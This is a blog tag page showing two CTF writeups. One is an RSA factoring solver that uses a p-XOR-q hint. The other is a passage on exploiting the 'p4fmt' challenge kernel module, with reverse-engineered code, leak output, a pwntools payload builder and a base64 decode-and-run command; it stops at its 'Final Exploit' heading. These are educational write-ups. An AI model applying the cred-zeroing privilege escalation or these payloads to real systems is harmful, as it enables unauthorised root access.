<!DOCTYPE html>
<html  lang="en">
<head>
    <meta charset="utf-8" />

<meta name="generator" content="Hexo 4.2.1" />

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<title>Tag: security - oalieno blog</title>


    <meta name="description" content="個人部落格">
<meta property="og:type" content="website">
<meta property="og:title" content="oalieno blog">
<meta property="og:url" content="https://oalieno.github.io/tags/security/page/2/index.html">
<meta property="og:site_name" content="oalieno blog">
<meta property="og:description" content="個人部落格">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://oalieno.github.io/images/ogimage.jpg">
<meta property="article:author" content="oalieno">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://oalieno.github.io/images/ogimage.jpg">




<link rel="canonical" href="https://oalieno.github.io/tags/security/page/2/"/>




<link rel="icon" href="/images/favicon.svg">

<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">


    
    
<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">

    
    
    
    
<link rel="stylesheet" href="/css/bottom-to-top.css">


    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-87869756-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-87869756-1');
</script>

    
    
    
    <link rel="stylesheet" href="/css/progressbar.css">
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
    
    <script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    


<link rel="stylesheet" href="/css/style.css">
</head>
<body class="is-2-column">
    <nav class="navbar navbar-main">
    <div class="container">
        <div class="navbar-brand is-flex-center">
            <a class="navbar-item navbar-logo" href="/">
            
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" width="25" height="25" style="margin-right: 10px"><g id="flat"><path d="M52,23a20,20,0,0,0-40,0V53a4,4,0,0,0,8,0V48a4,4,0,0,0,8,0v9a4,4,0,0    ,0,8,0V44a4,4,0,0,0,8,0V55a4,4,0,0,0,8,0Z" style="fill:#f98c96"/><rect x="19" y="44" width="2" height="2" style="fill:#e4544f"/><rect x="43" y="40" width="2" height="2" style    ="fill:#e4544f"/><path d="M32,37A12,12,0,0,0,44,25H20A12,12,0,0,0,32,37Z" style="fill:#fff"/><path d="M32,33a8,8,0,0,0,8-8H24A8,8,0,0,0,32,33Z" style="fill:#ffd782"/><path d=    "M32,29a4,4,0,0,0,4-4H28A4,4,0,0,0,32,29Z" style="fill:#e4544f"/><path d="M32,13h0A12,12,0,0,1,44,25v0a0,0,0,0,1,0,0H20a0,0,0,0,1,0,0v0A12,12,0,0,1,32,13Z" style="fill:#394d5    c"/><path d="M26,22H24c0-4.746,5.233-6,8-6l0,2C31.757,18,26,18.064,26,22Z" style="fill:#98a5a6"/><path d="M44.132,14.5C40.476,8.1,32.083,8,32,8V6c.392,0,9.629.085,13.868,7.5Z    " style="fill:#e4544f"/><circle cx="7" cy="10" r="3" style="fill:#f98c96"/><circle cx="57" cy="7" r="4" style="fill:#f98c96"/><circle cx="59" cy="37" r="3" style="fill:#f98c9    6"/><circle cx="5" cy="27" r="2" style="fill:#f98c96"/></g></svg>
                oalieno blog
            
            </a>
        </div>
        <div class="navbar-menu">
            
            <div class="navbar-start">
                
                <a class="navbar-item"
                href="/">首頁</a>
                
                <a class="navbar-item"
                href="/archives/">歷史文章</a>
                
                <a class="navbar-item"
                href="/categories/">分類</a>
                
                <a class="navbar-item"
                href="/tags/">標籤</a>
                
                <a class="navbar-item"
                href="/about/">關於我</a>
                
                <a class="navbar-item"
                href="/old/">舊部落格</a>
                
            </div>
            
            <div class="navbar-end">
                
                
                
                <a class="navbar-item search" title="Search" href="javascript:;">
                    <i class="fas fa-search"></i>
                </a>
                
                <a class="navbar-item github-source" href="https://github.com/oalieno/oalieno.github.io">
                    <div class="github-source-icon"><i class="fab fa-lg fa-github-alt"></i></div>
                    <div class="github-source-repository">
                        oalieno/oalieno.github.io
                    </div>
                </a>
            </div>
        </div>
    </div>
</nav>
    
    <section class="section">
        <div class="container">
            <div class="columns">
                <div class="column is-9-tablet is-9-desktop is-9-widescreen has-order-2 column-main"><div class="card">
    <div class="card-content">
        <nav class="breadcrumb" aria-label="breadcrumbs">
        <ul>
            <li><a href="/tags/">Tags</a></li>
            <li class="is-active"><a href="#" aria-current="page">security</a></li>
        </ul>
        </nav>
    </div>
</div>

    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2019-05-05T16:00:00.000Z">2019-05-06</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    2 minutes read (About 318 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2019/05/06/security/writeups/opqrx/">【Writeups】TSG CTF 2019 - OPQRX</a>
            
        </h1>
        <div class="content">
            <blockquote>
<p>Can you decrypt RSA? I’ll give a hint value, XOR.<br>
ここにRSAの暗号文がありますが、XORをあげるので、代わりに平文をください。</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">分數</th>
<th style="text-align:center">解題人數</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">497</td>
<td style="text-align:center">10</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="Writeups"><a class="header-anchor" href="#Writeups"></a>Writeups</h2>
<p>題目很簡單，RSA 加密，多給了 $p \oplus q$ 的值</p>
<p>$$<br>
\begin{align}<br>
&amp;p \oplus q = x \\<br>
&amp;p \times q = n \\<br>
\end{align}<br>
$$</p>
<p>已知 $x, n$ 求 $p, q$</p>
<p>假設 $x$ 的第一個 bit 是 0，那麼 $p, q$ 的第一個 bit 只有 $(0, 0)$ 或 $(1, 1)$ 兩種可能<br>
假設 $x$ 的第一個 bit 是 1，那麼 $p, q$ 的第一個 bit 只有 $(0, 1)$ 或 $(1, 0)$ 兩種可能</p>
<p>所以就直接爆搜加剪枝就過了，驚不驚喜，意不意外</p>
<h2 id="Final-Exploit"><a class="header-anchor" href="#Final-Exploit"></a>Final Exploit</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solver</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, n)</span>:</span></span><br><span class="line">		self.x = x</span><br><span class="line">		self.n = n</span><br><span class="line">		self.pq = [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, b, p, q)</span>:</span></span><br><span class="line">		<span class="keyword">if</span> p * q &lt;= n <span class="keyword">and</span> (p | (b - <span class="number">1</span>)) * (q | (b - <span class="number">1</span>)) &gt;= n:</span><br><span class="line">			self.pq.append((p, q))</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">for</span> shift <span class="keyword">in</span> tqdm(range(<span class="number">4095</span>, <span class="number">-1</span>, <span class="number">-1</span>)):</span><br><span class="line">			b = <span class="number">1</span> &lt;&lt; shift</span><br><span class="line">			pq, self.pq = self.pq, []</span><br><span class="line">			<span class="keyword">for</span> p, q <span class="keyword">in</span> pq:</span><br><span class="line">				<span class="keyword">if</span> self.x &amp; b:</span><br><span class="line">					self.add(b, p | b, q)</span><br><span class="line">					self.add(b, p, q | b)</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					self.add(b, p, q)</span><br><span class="line">					self.add(b, p | b, q | b)</span><br><span class="line">		<span class="keyword">return</span> self.pq[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">exec(open(<span class="string">'flag.enc'</span>).read().lower())</span><br><span class="line">solver = Solver(x, n)</span><br><span class="line">p, q = solver.solve()</span><br><span class="line">r = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, r)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h2 id="Flag"><a class="header-anchor" href="#Flag"></a>Flag</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSGCTF&#123;Absolutely, X should be &#39;S&#39; in &#39;OPQRX&#39;.&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ol>
<li><a href="https://furutsuki.hatenablog.com/entry/2019/05/05/163313#Crypto-497pts-10-Solves-OPQRX">https://furutsuki.hatenablog.com/entry/2019/05/05/163313#Crypto-497pts-10-Solves-OPQRX</a></li>
</ol>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2019/05/06/security/writeups/opqrx/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2019-04-25T16:00:00.000Z">2019-04-26</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    11 minutes read (About 1606 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2019/04/26/security/writeups/p4fmt/">【Writeups】Teaser Confidence CTF Quals 2019 - p4fmt</a>
            
        </h1>
        <div class="content">
            <blockquote>
<p>Kernel challs are always a bit painful. No internet access, no SSH, no file copying. You’re stuck with copy pasting base64’d (sometimes static) ELFs. But what if there was another solution? We’ve created a lightweight, simple binary format for your pwning pleasure. It’s time to prove your skills.<br>
<code>nc p4fmt.zajebistyc.tf 30002</code></p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">分數</th>
<th style="text-align:center">解題人數</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">304</td>
<td style="text-align:center">10</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="Writeup"><a class="header-anchor" href="#Writeup"></a>Writeup</h2>
<p>題目檔案解壓縮後有三個檔案 <code>bzImage</code>, <code>initramfs.cpio.gz</code>, <code>run.sh</code></p>
<p><code>bzImage</code> 是壓縮過的 linux kernel<br>
<code>initramfs.cpio.gz</code> 是臨時的檔案系統<br>
<code>run.sh</code> 裡面用 <code>qemu-system-x86_64</code> 把 kernel 跑起來</p>
<p>不熟悉 linux kernel debug 可以參考 <a href="/old/security/pwn/debug-kernel">Debug Kernel</a></p>
<h3 id="First-Glance"><a class="header-anchor" href="#First-Glance"></a>First Glance</h3>
<p><code>run.sh</code> 跑起來後就會跑 linux kernel 彈出一個 shell<br>
<code>ls</code> 一下可以看到三個比較重要的檔案 <code>init</code>, <code>p4fmt.ko</code>, <code>flag</code><br>
直接嘗試 <code>cat flag</code> 會得到 <code>Permission denied</code><br>
因為我們拿到的使用者是 <code>pwn</code> 而 <code>flag</code> 只有 <code>root</code> 有權限讀<br>
<code>init</code> 裡面有一行 <code>insmod /p4fmt.ko</code> 加載 <code>p4fmt.ko</code> 這個內核模塊<br>
看來我們的目標就是利用 <code>p4fmt.ko</code> 裡面的漏洞提權拿 root 權限，就可以 <code>cat flag</code> 了</p>
<h3 id="前置作業"><a class="header-anchor" href="#前置作業"></a>前置作業</h3>
<h4 id="解壓-initramfs-cpio-gz"><a class="header-anchor" href="#解壓-initramfs-cpio-gz"></a>解壓 <code>initramfs.cpio.gz</code></h4>
<p>可以先用 <code>binwalk</code> 把 <code>initramfs.cpio.gz</code> 的檔案系統拉出來</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x initramfs.cpio.gz</span><br><span class="line">binwalk -e initramfs.cpio</span><br></pre></td></tr></table></figure>
<h4 id="修改-init"><a class="header-anchor" href="#修改-init"></a>修改 <code>init</code></h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid cttyhack su root</span><br></pre></td></tr></table></figure>
<p>修改 <code>init</code> 讓我們有 root 權限，這樣才看得到 <code>p4fmt.ko</code> 內核模塊載入後的位址，等等才方便下斷點<br>
修改完重新打包 <code>initramfs.cpio.gz</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 | cpio --null --create --format=newc | gzip --best &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure>
<h4 id="修改-run-sh"><a class="header-anchor" href="#修改-run-sh"></a>修改 <code>run.sh</code></h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp:127.0.0.1:6666</span><br></pre></td></tr></table></figure>
<p>開了 gdb server 後，就可以用 gdb 連上去 debug 了<br>
首先先取得 <code>p4fmt</code> 內核模塊的位址<br>
可以用 <code>lsmod</code> 或 <code>cat /proc/modules</code> ( 必須有 root 權限 )</p>
<figure class="highlight bash"><figcaption><span>gdb</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote :6666</span><br><span class="line">(gdb) add-symbol-file p4fmt.ko 0xffffffffc0288000</span><br><span class="line">(gdb) b load_p4_binary <span class="comment"># 這是 p4fmt 主要的函式等等逆向會看到</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><figcaption><span>"取得 p4fmt 位址"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">p4fmt 16384 0 - Live 0xffffffffc0288000 (O)</span><br><span class="line">/ <span class="comment"># cat /proc/modules</span></span><br><span class="line">p4fmt 16384 0 - Live 0xffffffffc0288000 (O)</span><br></pre></td></tr></table></figure>
<h3 id="逆向"><a class="header-anchor" href="#逆向"></a>逆向</h3>
<p>起手式一樣 IDA 打開 ( 好像很多人改用 ghidra 了 O_O )<br>
但是這次的反編譯有點糟，大部分還是看組語配 gdb<br>
這個內核模塊主要的功能就是註冊一個新的執行檔格式 ( binary format )</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">p4fmt_init</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    _register_binfmt(&amp;p4format, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">p4fmt_init</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    unregister_binfmt(&amp;p4format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>p4format</code> 是一個 <a href="https://elixir.bootlin.com/linux/v5.0/source/include/linux/binfmts.h#L95"><code>linux_binfmt</code></a> 的結構</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lh</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">module</span>;</span></span><br><span class="line">	<span class="keyword">int</span> (*load_binary)(struct linux_binprm *);</span><br><span class="line">	<span class="keyword">int</span> (*load_shlib)(struct file *);</span><br><span class="line">	<span class="keyword">int</span> (*core_dump)(struct coredump_params *cprm);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_coredump;	<span class="comment">/* minimal dump size */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>其中的 <code>load_binary</code> 這個指標就是指向負責建立環境把程式跑起來的函式<br>
而在這裡就是指向 <code>load_p4_binary</code> 這個函式 ( 一般的 ELF 執行檔是 <code>load_elf_binary</code> )</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">load_p4_binary</span> <span class="params">(linux_binprm *bprm)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://elixir.bootlin.com/linux/v5.0/source/include/linux/binfmts.h#L17"><code>linux_binprm</code></a> 會先讀檔案的前 128 bytes 放進 <code>bprm-&gt;buf</code><br>
因為有這個結構有 <a href="https://lwn.net/Articles/722293/"><code>__randomize_layout</code></a>，所以結構成員的順序是隨機的<br>
這題的 <code>bprm-&gt;buf</code> 從 <code>0x48</code> 開始 128 bytes，可見下圖</p>
<p align="center"><img data-src="https://i.imgur.com/XlPKVe1.png" class=" lazyload"  width="500" title="linux_binprm 格式"></p>
<p>程式一開始會先檢查前兩個 bytes 是不是 <code>P4</code><br>
接著檢查第三個 byte 是不是 <code>\x00</code>，不是的話會噴 <code>Unknown version</code><br>
接著第四個 byte 可以是 <code>\x00</code> 或 <code>\x01</code>，<code>\x00</code> 的話會進簡單的路線，<code>\x01</code> 會進複雜的路線<br>
接著四個 bytes 代表後面有幾個 mapping<br>
接著八個 bytes 代表 mapping 的開頭在 buf 的 offset<br>
接著八個 bytes 擺的是 entry point 的位址<br>
其他的部分基本上跟 <code>load_elf_binary</code> 一樣</p>
<figure class="highlight c"><figcaption><span>simple</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm_mmap(bprm-&gt;file, *(QWORD *)(bprm + <span class="number">0x50</span>), <span class="number">0x1000</span>, *(QWORD *)(bprm + <span class="number">0x50</span>) &amp; <span class="number">7</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><figcaption><span>complex</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">p4_mapping</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> load_addr;</span><br><span class="line">    <span class="keyword">long</span> length;</span><br><span class="line">    <span class="keyword">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mapping_count = *(<span class="keyword">int</span> *)(bprm-&gt;buf + <span class="number">4</span>);</span><br><span class="line"><span class="keyword">long</span> mapping_offset = *(<span class="keyword">long</span> *)(bprm-&gt;buf + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">p4_mapping *mapping = bprm-&gt;buf + mapping_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mapping_count; i++, mapping++) &#123;</span><br><span class="line">    <span class="keyword">long</span> addr = mapping-&gt;load_addr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>;</span><br><span class="line">    <span class="keyword">long</span> prot = mapping-&gt;load_addr &amp; <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n"</span>, addr, mapping-&gt;length, mapping-&gt;offset, prot);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mapping-&gt;load_addr &amp; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="comment">// 這裡就是要初始化一段記憶體，類似 .bss 段</span></span><br><span class="line">        vm_mmap(<span class="number">0</span>, addr, mapping-&gt;length, prot, <span class="number">2</span>, mapping-&gt;offset);</span><br><span class="line">        printk(<span class="string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, mapping-&gt;load_addr, mapping-&gt;length);</span><br><span class="line">        _clear_user(mapping-&gt;load_addr, mapping-&gt;length);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 這裡是要把檔案掛上去，類似 .text 段</span></span><br><span class="line">        vm_mmap(bprm-&gt;file, addr, mapping-&gt;length, prot, <span class="number">2</span>, mapping-&gt;offset);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞"><a class="header-anchor" href="#漏洞"></a>漏洞</h3>
<p><code>mapping_count</code> 改大可以 leak <code>linux_binprm</code> 其他欄位的值<br>
<code>_clear_user</code> 沒有檢查，可以把 kernel 上任意位址的值清空<br>
<code>linux_binprm</code> 有一個 <code>cred</code> 的結構，裡面存的就是 <code>uid, gid</code><br>
所以我們只要 leak 出這個 <code>cred</code> 的位址，然後用 <code>_clear_user</code> 清成 0，我們的程式就是 root 權限了 ( root 的 uid 是 0 )</p>
<h3 id="嘗試"><a class="header-anchor" href="#嘗試"></a>嘗試</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b"P4"</span>             <span class="comment"># magic</span></span><br><span class="line">payload += p8(<span class="number">0</span>)             <span class="comment"># version</span></span><br><span class="line">payload += p8(<span class="number">1</span>)             <span class="comment"># type</span></span><br><span class="line">payload += p32(<span class="number">1</span>)            <span class="comment"># mapping_count</span></span><br><span class="line">payload += p64(<span class="number">0x18</span>)         <span class="comment"># mapping_offset</span></span><br><span class="line">payload += p64(<span class="number">0x400030</span>)     <span class="comment"># entry</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mapping</span></span><br><span class="line">payload += flat(</span><br><span class="line">    <span class="number">0x400000</span> | <span class="number">7</span>,</span><br><span class="line">    <span class="number">0x1000</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload += asm(shellcraft.echo(<span class="string">"test\n"</span>) + shellcraft.exit())</span><br><span class="line"></span><br><span class="line">print(<span class="string">f'echo <span class="subst">&#123;b64encode(payload).decode()&#125;</span> | base64 -d &gt; a ; chmod +x a ; ./a'</span>)</span><br></pre></td></tr></table></figure>
<p>先寫個簡單的 p4 格式的執行檔測試一下我們的理解是不是對的</p>
<figure class="highlight bash"><figcaption><span>command</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> UDQAAQEAAAAYAAAAAAAAADAAQAAAAAAABwBAAAAAAAAAEAAAAAAAAAAAAAAAAAAASLgBAQEBAQEBAVBIuHVkcnULAQEBSDEEJGoBWGoBX2oFWkiJ5g8FajxYDwU= | base64 -d &gt; a ; chmod +x a ; ./a</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><figcaption><span>output</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[50353.170813] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>接下來要找 <code>cred</code> 的位址，因為 <code>pwn</code> 的 <code>uid</code> 是 1000 ( = 0x3e8 )<br>
所以我們把使用者切換成 <code>pwn</code>，切成 <code>pwn</code> 之後要在 <code>/tmp</code> 才可以寫檔<br>
然後把 <code>mapping_count</code> 改大一點，比如 <code>6</code>，在他印出的位址指向的值中找 <code>0x3e8</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[50800.668734] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)</span><br><span class="line">[50800.674080] vm_mmap(load_addr=0x10101010101b000, length=0x726475b848500101, offset=0x431480101010b75, prot=0)</span><br><span class="line">[50800.674550] clear_user(addr=0x10101010101b848, length=0x726475b848500101)</span><br><span class="line">[50800.675372] vm_mmap(load_addr=0x6a5f016a58016000, length=0x6a050fe689485a05, offset=0x50f583c, prot=4)</span><br><span class="line">[50800.675786] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)</span><br><span class="line">[50800.676003] vm_mmap(load_addr=0x0, length=0x7fffffffef99, offset=0x100000001, prot=0)</span><br><span class="line">[50800.676260] vm_mmap(load_addr=0x0, length=0xffffa1c307595b40, offset=0x0, prot=0)</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>找了一找發現在第六個 <code>vm_mmap</code> 的 <code>0xffffa1c307595b40</code> 這個位址是 <code>cred</code><br>
但是這個位址每次跑起來都不一樣，不過多跑幾次會發現，這個值會一直循環重複利用，所以只要多跑幾次就會對了</p>
<h2 id="Final-Exploit"><a class="header-anchor" href="#Final-Exploit"></a>Final Exploit</h2>
